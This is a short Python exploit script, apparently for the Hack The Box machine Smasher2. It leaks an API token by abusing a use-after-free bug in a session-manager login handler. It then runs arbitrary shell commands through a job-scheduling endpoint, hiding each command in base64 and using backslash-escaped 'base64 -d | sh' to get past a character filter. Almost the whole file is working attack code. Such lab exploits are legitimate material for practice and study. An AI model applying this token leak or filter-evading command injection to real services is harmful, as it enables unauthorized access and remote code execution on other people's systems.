#!/usr/bin/env python3

'''

By matterbeam.
'''

import argparse
import base64
import json
import requests


class Session(requests.Session):
    '''
    Wrapper around requests.Session to make requests to the API.
    '''

    URL = 'http://10.10.10.135'

    def __init__(self, *args, **kargs):
        super().__init__(*args, **kargs)
        self.headers.update({
            # Handle Virtual Host Routing with the 'Host' header.
            'Host': 'wonderfulsessionmanager.smasher2.htb',
            'Content-Type': 'application/json',
        })
        # Grab a valid session cookie.
        self.get(self.URL)

    def post(self, endpoint='/', data={}):
        '''
        Wrapper around the POST method to handle json encoding.
        '''
        return requests.Session.post(self, f'{self.URL}{endpoint}', json.dumps(data))


def leak_token():
    '''
    Leak the API token exploiting the UAF bug present in the ses module.
    '''
    s = Session()
    print('[*] Leaking API token')

    data = {'action': 'auth', 'data': {}}

    print('[*] Sending 10 unsuccessful authentication requests...')
    data['data'] = {'username': 'matterbeam', 'password': 'matterbeam'} # Invalid credentials
    for i in range(10):
        s.post('/auth', data)

    print('[*] Vulnerable codepath prepared, sending last attempt with the exploit')
    data['data'] = ['matterbeam', 'matterbeam', 123456789]
    r = s.post('/auth', data)

    result = json.loads(r.text)['result']
    token = result[result.find(": [") + 2 : result.find("] -") + 1].split(', ')[1][1:-1]

    print(f'[+] API token leaked: {token}')

    # Apparently, when we use this method to extract the API key, the service becomes
    # unavailable to further API requests (even though we are using a new session).
    # Exit the program and enter the token manually to skip this process.
    print('[*] Use this token with -t option to execute a command on Smasher2')
    exit(0)


def rce(token, cmd):
    '''
    Execute commands remotely on Smasher2 box.
    '''
    # Obfuscate the command to bypass filtered characters.
    encoded = base64.b64encode(bytes(cmd, 'utf-8')).decode('utf-8')
    payload = f'bas\\e64 -\\d <<<{encoded}|s\\h'

    print('[*] Executing command remotely...')
    s = Session()

    r = s.post(f'/api/{token}/job', {'schedule': payload})
    print('[+] Output:\n')
    print(json.loads(r.text)['result'])


if __name__ == '__main__':

    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--token', help='Use this API token (won\'t leak it)')
    parser.add_argument('-c', '--command', help='Execute this command on Smasher2 box (requires -t)')
    args = parser.parse_args()

    token = args.token if args.token is not None else leak_token()
    if args.command is not None:
        rce(token, args.command)

